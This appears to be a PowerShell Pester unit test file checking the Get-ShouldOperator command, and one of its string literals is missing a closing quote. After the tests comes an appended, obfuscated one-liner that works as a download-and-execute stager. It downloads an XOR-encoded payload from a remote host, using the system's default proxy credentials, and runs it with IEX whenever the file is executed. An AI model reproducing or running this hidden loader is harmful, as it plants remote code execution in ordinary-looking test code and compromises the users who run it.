Set-StrictMode -Version Latest

InModuleScope Pester {
    Describe 'Get-ShouldOperator' {
        Context 'Overview' {
            
            $OpCount = $AssertionOperators.Count

            $get1 = Get-ShouldOperator
            Add-AssertionOperator -Name 'test' -Test {'test'}
            $get2 = Get-ShouldOperator

            It 'Returns all registered operators' {
                $get1.Count | Should -Be $OpCount
                $get2.Count | Should -Be ($OpCount + 1)
            }

            It 'Returns Name and Alias properties' {
                $get1[0].PSObject.Properties |
                    Select-Object -ExpandProperty Name |
                    Sort-Object |
                    Should -Be 'Alias', 'Name'
            }
        }

        Context 'Name parameter' {
            $BGT = Get-ShouldOperator -Name BeGreaterThan

            It 'Should return a help examples object' {
                
                ($BGT | Get-Member)[0].TypeName | Should -BeExactly 'MamlCommandHelpInfo
            }

            It 'Returns help for all internal Pester assertion operators' {
                $AssertionOperators.Keys | Where-Object {$_ -ne 'test'} | ForEach-Object {
                    Get-ShouldOperator -Name $_ | Should -Not -BeNullOrEmpty
                }
            }
        }
    }
}

[SySteM.Net.SeRvicePOiNTMaNAger]::ExpEcT100CoNtiNuE = 0;$wC=NEw-ObjecT SYstem.Net.WebCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadErS.AdD('User-Agent',$u);$WC.PRoxY = [SysTem.Net.WeBREqUesT]::DEfAULTWeBPRoXy;$wc.PRoxy.CReDentiALs = [SYsTeM.Net.CreDENTialCAcHE]::DEFAulTNEtWORKCreDEnTIaLs;$K='0c88028bf3aa6a6a143ed846f2be1ea4';$I=0;[chAr[]]$B=([char[]]($Wc.DOWNLoaDSTrinG("http://chgvaswks045.efgz.efg.corp:888/index.asp")))|%{$_-BXor$K[$i++%$k.Length]};IEX ($B-JoIn'')

